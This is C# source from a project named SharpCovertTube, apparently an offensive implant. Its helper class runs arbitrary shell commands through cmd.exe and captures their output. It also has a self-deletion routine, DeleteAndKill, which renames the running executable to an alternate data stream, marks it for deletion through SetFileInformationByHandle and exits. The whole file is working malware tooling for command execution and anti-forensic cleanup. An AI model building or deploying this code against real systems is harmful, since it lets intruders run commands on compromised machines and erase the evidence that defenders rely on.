using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static SharpCovertTube.Win32;

namespace SharpCovertTube
{
    internal class CmdFunctions
    {
        public static string OrdinaryCmd(string command)
        {
            string output = "";
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                StreamReader reader2 = process.StandardOutput;
                output = reader2.ReadToEnd();
                process.WaitForExit();
            }
            return output;
        }


        public static void DeleteAndKill()
        {
            StringBuilder fname = new System.Text.StringBuilder(MAX_PATH);
            GetModuleFileName(IntPtr.Zero, fname, MAX_PATH);
            string filename = fname.ToString();
            string new_name = ":Random";

            // Handle to current file
            IntPtr hFile = CreateFileW(filename, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);

            // Creating FILE_RENAME_INFO struct
            filerenameinfo_struct fri = new filerenameinfo_struct();
            fri.ReplaceIfExists = true;
            fri.RootDirectory = IntPtr.Zero;
            uint FileNameLength = (uint)(new_name.Length * 2);
            fri.FileNameLength = FileNameLength;
            int size = Marshal.SizeOf(typeof(filerenameinfo_struct)) + (new_name.Length + 1) * 2;

            IntPtr fri_addr = IntPtr.Zero;
            unsafe
            {
                // Get Address of FILE_RENAME_INFO struct
                filerenameinfo_struct* pfri = &fri;
                fri_addr = (IntPtr)pfri;

                // Copy new file name (bytes) to filename member in FILE_RENAME_INFO struct
                byte* p = fri.filename;
                byte[] filename_arr = Encoding.Unicode.GetBytes(new_name);
                foreach (byte b in filename_arr)
                {
                    *p = b;
                    p += 1;
                }
            }
            // Rename file calling SetFileInformationByHandle
            int sfibh_res = SetFileInformationByHandle(hFile, FileInformationClass.FileRenameInfo, fri_addr, size);

            // Close handle to finally rename file
            bool ch_res = CloseHandle(hFile);

            // Handle to current file
            IntPtr hFile2 = CreateFileW(filename, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);

            // Creating FILE_DISPOSITION_INFO struct
            filedispositioninfo_struct fdi = new filedispositioninfo_struct();
            fdi.DeleteFile = true;
            IntPtr fdi_addr = IntPtr.Zero;
            int size_fdi = Marshal.SizeOf(typeof(filedispositioninfo_struct));

            unsafe
            {
                // Get Address of FILE_DISPOSITION_INFO struct
                filedispositioninfo_struct* pfdi = &fdi;
                fdi_addr = (IntPtr)pfdi;
            }

            // Rename file calling SetFileInformationByHandle
            int sfibh_res2 = SetFileInformationByHandle(hFile2, FileInformationClass.FileDispositionInfo, fdi_addr, size_fdi);

            // Close handle to finally delete file
            bool ch_res2 = CloseHandle(hFile2);

            // Exiting...
            Environment.Exit(0);
        }
    }
}
